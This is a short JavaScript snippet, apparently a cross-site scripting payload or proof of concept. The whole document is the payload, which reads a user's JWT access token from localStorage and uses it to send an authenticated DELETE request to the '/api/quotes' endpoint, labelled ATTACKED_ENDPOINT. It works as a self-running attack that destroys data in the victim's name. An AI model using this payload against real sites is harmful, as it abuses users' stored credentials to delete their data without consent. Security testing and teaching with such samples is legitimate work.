(() => {
  const ATTACKED_ENDPOINT = "/api/quotes";
  void fetch(ATTACKED_ENDPOINT, {
    method: "DELETE",
    headers: {
      authorization: "Bearer " + localStorage.getItem("JWT_ACCESS_TOKEN_KEY"), // Get token from localStorage
    },
  });
})();
